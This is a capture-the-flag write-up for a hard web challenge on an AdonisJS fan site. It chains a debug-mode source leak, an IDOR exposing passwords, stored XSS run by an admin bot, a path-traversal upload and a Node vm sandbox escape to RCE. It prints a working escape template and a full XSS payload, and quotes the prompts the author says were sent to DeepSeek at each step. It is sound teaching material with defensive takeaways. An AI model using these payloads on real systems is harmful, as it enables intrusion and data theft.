# One Last Review

- **Event:** NexSec CTF 2026
- **Category:** Web
- **Difficulty:** Hard
- **Flag:** `nexsec26{Did_you_enjoy_DnD_song?kinda_g00d_actually_oh_btw_this_is_4don1s_cve_845ec5d251ac9e2bae799671eb8673d32142c4c80cf8e6961692359189a79ed1}`

> Competition rule note: the only AI allowed in this CTF is DeepSeek, so every step below was driven by prompting DeepSeek. I've included the exact prompts I sent it next to what I did with its answers.

## Overview

The target is an "Ado" fan site called **OneLastReview**, built on **AdonisJS v5**. At first glance it's just a landing page, a login, and a comments page. The real path to the flag is a chain:

1. Info disclosure — debug mode leaks source via a type-confusion crash
2. IDOR — an internal endpoint leaks a user's password with no auth
3. Stored XSS — the admin moderation page renders comments unescaped, and an admin bot visits it
4. Path traversal upload — a vendored bodyparser lets me overwrite a server file
5. `vm` sandbox escape → RCE — the "generate report" feature runs my file and I break out to read the flag

The flag lives in `/app/flag.txt` (mode `400`), so nothing short of code execution as the app user gets it.

## 1. Recon

I started by just mapping the app.

> **Me → DeepSeek:** "yo i got a web ctf, target is `http://koala.nexsec.my:37373`. flag looks like `nexsec26{...}`. can u start by looking at the homepage source and tell me what pages + api endpoints the js is calling"

> Note: the instance is re-spawned on a new port each time, so I'll use `B` for the base URL in the commands below:
>
> ```bash
> B="http://koala.nexsec.my:37373"   # swap in whatever port your instance is on
> ```

The homepage links to `/login`. The login page JS posts JSON to `/api/v1/auth/login` and, on success, redirects to `/admin` if `role === 'admin'`, otherwise `/posts/1/comments`. The comments page posts to `/api/v1/comments`.

So the interesting bits are an API under `/api/v1/` and an admin area I can't reach yet.

## 2. Info disclosure (debug mode on)

DeepSeek pointed out that the login handler never validates input types, so I fed it a non-string username.

> **Me → DeepSeek:** "the login sends json to that auth endpoint. what if the backend doesnt check the input type? try sending the username as an object instead of a string and show me what comes back"

```bash
curl -s "$B/api/v1/auth/login" -H 'Content-Type: application/json' \
  -d '{"username":{"a":1},"password":1}'
```

This 500s with a full **Youch** debug stack trace (AdonisJS debug mode is on = information disclosure). It leaks the source:

```js
// AuthController.login
const username = request.input('username', '')
const password = request.input('password', '')
const user = store.findUserByUsername(username)   // username.toLowerCase() -> crash on non-string
if (!user || user.password !== password) {
  return response.status(401).json({ error: 'Invalid credentials' })
}
```

So auth is a plaintext password compare against an in-memory user store. Good to know — but the crash only leaks method bodies, not the seeded users, so I can't read the passwords this way.

## 3. Route enumeration + IDOR

> **Me → DeepSeek:** "debug mode is on and leaked source, its adonisjs. enumerate all the routes even the ones not in the ui. which need auth"

Brute-forcing plus the leaked source revealed extra routes:

```
GET  /api/v1/internal/accounts/:id
GET  /admin                 (admin only)
GET  /admin/comments        (admin only)
POST /admin/upload          (admin only)
GET  /admin/generate-report (admin only)
```

That internal accounts endpoint is an **IDOR**:

> **Me → DeepSeek:** "theres this internal accounts endpoint `/api/v1/internal/accounts/:id`. hit it with no auth, try id 1-5, what leaks and which ids work"

```bash
for i in 1 2 3 4 5; do echo "id=$i: $(curl -s "$B/api/v1/internal/accounts/$i")"; done
```

```json
id=1: {"error":"Account not found"}
id=2: {"error":"Account not found"}
id=3: {"id":3,"username":"Hana","email":"...","recoveryToken":"RT-...","password":"Kyaaaaa_Adoo_kawaidesu_><"}
id=4: {"id":4,"username":"Rimi","email":"...","recoveryToken":"RT-...","password":"rimiimimi_dnd!!"}
```

The controller only blocks ids 1–2 (admin + Ado) and happily returns `password` for Hana (3) and Rimi (4). Now I have working non-admin credentials.

## 4. Logging in

```bash
curl -s -c jar "$B/api/v1/auth/login" -H 'Content-Type: application/json' \
  -d '{"username":"Hana","password":"Kyaaaaa_Adoo_kawaidesu_><"}'
# {"message":"Logged in","username":"Hana","role":"user"}
```

> Gotcha I hit: the AdonisJS session cookie **rotates on every request**, so I had to load *and* re-save the cookie jar on each call (`curl -b jar -c jar ...`) or I'd get bounced back to "not logged in".

I'm a normal user now. I still need admin — and the admin password comes from an env var, which the IDOR won't give me. So I need the admin to act for me.

## 5. Stored XSS + the admin bot

> **Me → DeepSeek:** "logged in as a normal user. i need admin. check how /admin/comments renders comments and whether theres a bot visiting it"

The admin moderation view renders the comment body **unescaped**:

```edge
<p class="comment-body">{{{ comment.body }}}</p>
```

In Edge, `{{{ }}}` is raw output = **stored XSS**. And there's a headless **admin bot** (puppeteer) that logs in as admin and browses `/admin/comments` on a timer. So anything I post as a comment runs as admin.

## 6. Path traversal upload (vendored bodyparser)

What can the admin do for me? Two things stand out:

- `POST /admin/upload` moves an uploaded file with `join(dir, clientName)` — and the vendored `bodyparser-10.1.1` does **not** sanitize `clientName`. A multipart filename of `../reports/template.js` escapes the uploads folder.
- `GET /admin/generate-report` reads `storage/reports/template.js` and runs it in a Node `vm`.

> **Me → DeepSeek:** "does file.move clean the filename or can i send `../reports/template.js` as the name to overwrite the report template (path traversal)?"

Confirmed from the vendored source — no sanitization. So I can overwrite the report template with my own JS.

## 7. `vm` sandbox escape → RCE

```js
// AdminUploadController.generateReport (simplified)
const sandbox = { module: { exports: {} } }
vm.createContext(sandbox)
vm.runInContext(fs.readFileSync(templatePath, 'utf8'), sandbox)
const result = sandbox.module.exports.generate()
```

`module` is a **host object** passed into the sandbox, so `module.constructor.constructor` reaches the host realm's `Function` and I can grab the real `process`:

> **Me → DeepSeek:** "generate-report runs my file in a `vm` but `module` is a host object. how do i escape that sandbox to get `process` and read a file?"

Malicious `template.js`:

```js
const P = module.constructor.constructor('return process')();
let out;
try { out = P.mainModule.require('fs').readFileSync('/app/flag.txt','utf8'); }
catch (e) { out = P.mainModule.require('child_process').execSync('cat /app/flag.txt').toString(); }
module.exports = { generate: () => out };
```

## 8. Chaining it all in one stored-XSS comment

> **Me → DeepSeek:** "chain it: a stored xss comment that as admin uploads an evil template.js via the path traversal, calls generate-report to pop the vm and read /app/flag.txt, then posts the result back as a comment on a public post i can read"

The payload I posted as Hana (the admin bot executes it):

```html
<script>(async()=>{try{
  const tpl = "const P=module.constructor.constructor('return process')();let out;try{out=P.mainModule.require('fs').readFileSync('/app/flag.txt','utf8')}catch(e){out=P.mainModule.require('child_process').execSync('cat /app/flag.txt').toString()}module.exports={generate:()=>out};";
  const body = '--WZ9\r\nContent-Disposition: form-data; name="attachment"; filename="../reports/template.js"\r\nContent-Type: application/javascript\r\n\r\n'+tpl+'\r\n--WZ9--\r\n';
  await fetch('/admin/upload',{method:'POST',headers:{'Content-Type':'multipart/form-data; boundary=WZ9'},body});
  const r = await fetch('/admin/generate-report').then(x=>x.json());
  await fetch('/api/v1/comments',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({postId:9999,body:'FLAGDROP '+JSON.stringify(r)})});
}catch(e){await fetch('/api/v1/comments',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({postId:9999,body:'XSSERR '+String(e)})});}})()</script>
```

Steps:
1. The admin bot loads `/admin/comments`; my `<script>` runs in its admin session.
2. It overwrites `storage/reports/template.js` through the path-traversal upload.
3. It calls `/admin/generate-report`, which runs my template → breaks out of the `vm` → reads `/app/flag.txt`.
4. It posts the result as a comment on **public** post `9999`.

Then I just polled the public page:

```bash
curl -s "$B/posts/9999/comments" | grep -oE 'nexsec26\{[^}]*\}'
```

Within one bot cycle:

```
nexsec26{Did_you_enjoy_DnD_song?kinda_g00d_actually_oh_btw_this_is_4don1s_cve_845ec5d251ac9e2bae799671eb8673d32142c4c80cf8e6961692359189a79ed1}
```

The flag even name-drops the root cause: the **AdonisJS bodyparser path-traversal CVE**.

## Flag

```
nexsec26{Did_you_enjoy_DnD_song?kinda_g00d_actually_oh_btw_this_is_4don1s_cve_845ec5d251ac9e2bae799671eb8673d32142c4c80cf8e6961692359189a79ed1}
```

## Takeaways

- **Never ship debug/Youch error pages in production** — the type-confusion 500 handed me the source.
- **Authorization != "is the id mine"** — the internal accounts IDOR leaked other users' passwords outright.
- **`{{{ }}}` in Edge is raw HTML** — use `{{ }}` for user content, or you get stored XSS straight to the admin bot.
- **`file.move()` must sanitize the client filename** — the vendored bodyparser's missing check gave an arbitrary-write/path-traversal (the CVE this challenge is modeled on).
- **`vm` is not a security boundary** — passing a host object (`module`) into the context is an instant escape to RCE.
